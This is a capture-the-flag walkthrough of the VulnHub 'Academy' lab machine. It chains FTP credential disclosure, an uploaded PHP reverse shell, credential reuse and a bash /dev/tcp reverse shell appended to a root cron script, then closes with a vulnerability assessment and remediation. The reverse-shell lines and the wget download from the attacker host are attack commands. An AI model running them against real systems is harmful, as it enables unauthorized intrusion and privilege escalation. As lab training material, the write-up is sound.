# Academy - TCM Machine Walkthrough

<p align="center">
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/OS-Linux-blue">
  <img src="https://img.shields.io/badge/Status-Rooted-success">
</p>

> **Platform:** VulnHub  
> **Machine:** Academy  
> **Difficulty:** Easy  
> **Objective:** Gain root access and capture the flag.

---

# Table of Contents

- [Overview](#overview)
- [Methodology](#methodology)
- [Reconnaissance](#reconnaissance)
- [Enumeration](#enumeration)
- [Initial Exploitation](#initial-exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Flag Capture](#flag-capture)
- [Vulnerability Assessment](#vulnerability-assessment)
- [Key Takeaways & Lessons Learned](#key-takeaways--lessons-learned)
- [Pentester's Final Observation](#pentesters-final-observation)

---

# Overview

The Academy machine demonstrates how several seemingly minor security weaknesses can be chained together to achieve complete system compromise.

The attack path involved:

1. Information disclosure through FTP.
2. Weak password storage using MD5.
3. Unrestricted file upload resulting in Remote Code Execution.
4. Credential reuse.
5. Insecure cron execution leading to root compromise.

---

# Methodology

```text
Reconnaissance
      ↓
Enumeration
      ↓
Credential Discovery
      ↓
File Upload → RCE
      ↓
Local Enumeration
      ↓
Credential Reuse
      ↓
Cron Abuse
      ↓
Root Access
```

---

# Reconnaissance

## Host Discovery

```bash
netdiscover
```

or

```bash
nmap -sn 192.168.126.0/24
```

## Port Discovery & Service Enumeration

```bash
nmap -sS -p- -A <TARGET-IP>
```

### Findings

- Port 80 (HTTP)
- Academy web application

📸 **Insert Screenshot:** Host discovery and Nmap results.

### Pentester's Observation

The first objective is to understand the exposed attack surface. A single web application can often provide enough opportunities to fully compromise a system.

---

# Enumeration

## Web Enumeration

```text
http://<TARGET-IP>
```

📸 **Insert Screenshot:** Academy homepage.

## Directory Enumeration

```bash
gobuster dir \
-u http://<TARGET-IP> \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Interesting directories revealed an FTP resource.

📸 **Insert Screenshot:** Directory enumeration.

---

## FTP Information Disclosure

Discovered credentials:

```text
Username: 10201321
Password: cd73502828457d15655bbd7a63fb0bc8
```

The password resembled a hash and was identified as:

```text
student
```

Final credentials:

```text
Username: 10201321
Password: student
```

📸 **Insert Screenshot:** Hash identification.

### Pentester's Observation

Whenever credentials resemble hashes, always attempt identification and cracking before assuming they are plaintext.

---

# Initial Exploitation

## Student Portal Login

```text
Username: 10201321
Password: student
```

📸 **Insert Screenshot:** Successful login.

---

## File Upload Functionality

The profile page:

```text
/my_profile.php
```

suggests that the server is running PHP and allows image uploads.

📸 **Insert Screenshot:** Upload functionality.

### Pentester's Observation

File upload functionality is one of the highest-value attack vectors during web application testing because weak validation can quickly lead to Remote Code Execution.

---

## Uploading a PHP Reverse Shell

Use:

```text
https://github.com/pentestmonkey/php-reverse-shell
```

Modify:

```php
$ip = 'ATTACKER-IP';
$port = 1234;
```

Listener:

```bash
nc -lvnp 1234
```

Upload:

```text
photo.php
```

📸 **Insert Screenshot:** Reverse shell upload.

---

## Obtaining Remote Code Execution

```bash
hostname
whoami
```

Outputs:

```text
academy
www-data
```

📸 **Insert Screenshot:** Reverse shell.

### Pentester's Observation

Initial access is only the beginning. The next objective is always privilege escalation.

---

# Privilege Escalation

## Local Enumeration with LinPEAS

```bash
python3 -m http.server 8000
wget http://ATTACKER-IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Discovered:

```php
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
```

📸 **Insert Screenshot:** LinPEAS findings.

### Pentester's Observation

Configuration files often contain credentials and should always be inspected after gaining shell access.

---

## Credential Reuse

```bash
ssh grimmie@<TARGET-IP>
```

Password:

```text
My_V3ryS3cur3_P4ss
```

📸 **Insert Screenshot:** SSH as grimmie.

### Pentester's Observation

Credential reuse is one of the most common real-world weaknesses and frequently enables privilege escalation.

---

## Investigating Cron Jobs

A file named:

```text
backup.sh
```

was found in the user's home directory.

Using pspy confirmed that the script was executed by root.

📸 **Insert Screenshot:** pspy output.

### Pentester's Observation

Writable scripts executed by root are excellent privilege escalation opportunities.

---

## Cron Exploitation

Append:

```bash
bash -i >& /dev/tcp/ATTACKER-IP/8081 0>&1
```

Start listener:

```bash
nc -nvlp 8081
```

The machine connects back as root.

📸 **Insert Screenshot:** Root shell.

---

# Flag Capture

```bash
whoami
cat /root/flag.txt
```

Output:

```text
root
```

📸 **Insert Screenshot:** Flag capture.

---

# Vulnerability Assessment

## 1. Information Disclosure via FTP

- **Severity:** High
- **CVSS v3.1:** 7.5

### Impact

Unauthorized access to application credentials.

### Remediation

- Remove sensitive files from public locations.
- Disable anonymous FTP.
- Restrict access using ACLs.

**Priority:** P2

---

## 2. Weak Password Storage (MD5)

- **Severity:** High
- **CVSS v3.1:** 7.5
- **CWE-327**
- **CWE-759**

### Remediation

- Use Argon2id, bcrypt, or scrypt.
- Implement salting.
- Enforce strong password policies.

**Priority:** P2

---

## 3. Unrestricted File Upload (RCE)

- **Severity:** Critical
- **CVSS v3.1:** 9.8
- **CWE-434**

### Remediation

- Validate file signatures and MIME types.
- Store uploads outside the web root.
- Disable script execution in upload directories.
- Implement allowlists.

**Priority:** P1

---

## 4. Credential Reuse

- **Severity:** High
- **CVSS v3.1:** 8.8
- **CWE-798**

### Remediation

- Separate application and system credentials.
- Rotate passwords.
- Use secrets management.

**Priority:** P1

---

## 5. Plaintext Credentials in Configuration Files

- **Severity:** Medium
- **CVSS v3.1:** 6.5
- **CWE-256**

### Remediation

- Store secrets in environment variables.
- Restrict file permissions.
- Use secret management solutions.

**Priority:** P3

---

## 6. Insecure Cron Permissions

- **Severity:** Critical
- **CVSS v3.1:** 9.8
- **CWE-732**

### Remediation

```bash
chown root:root backup.sh
chmod 700 backup.sh
```

- Audit cron jobs regularly.
- Monitor integrity of privileged scripts.

**Priority:** P1

---

## Vulnerability Prioritization Matrix

| Vulnerability | Severity | Priority |
|--------------|-----------|-----------|
| Unrestricted File Upload | Critical | P1 |
| Insecure Cron Permissions | Critical | P1 |
| Credential Reuse | High | P1 |
| Information Disclosure | High | P2 |
| Weak Password Storage | High | P2 |
| Plaintext Credentials | Medium | P3 |

---

# Key Takeaways & Lessons Learned

## Offensive Lessons

- Information disclosure can lead to complete compromise.
- File upload functionality should always be tested.
- Configuration files frequently expose credentials.
- Credential reuse remains highly dangerous.
- Process monitoring tools like pspy are invaluable.

## Defensive Lessons

- Enforce secure password storage.
- Validate file uploads.
- Separate credentials.
- Secure cron jobs.
- Implement least privilege.

---

# Pentester's Final Observation

The Academy machine perfectly demonstrates the concept of vulnerability chaining.

No single vulnerability directly resulted in root compromise. Instead, several weaknesses combined to create a complete attack path:

```text
Information Disclosure
        ↓
Weak Password Storage
        ↓
Remote Code Execution
        ↓
Credential Reuse
        ↓
Insecure Cron Permissions
        ↓
Root Compromise
```

> Security failures rarely occur because of a single vulnerability. They occur when several weaknesses coexist and amplify one another.

The key question throughout this engagement was:

**"What does this new piece of information allow me to do next?"**
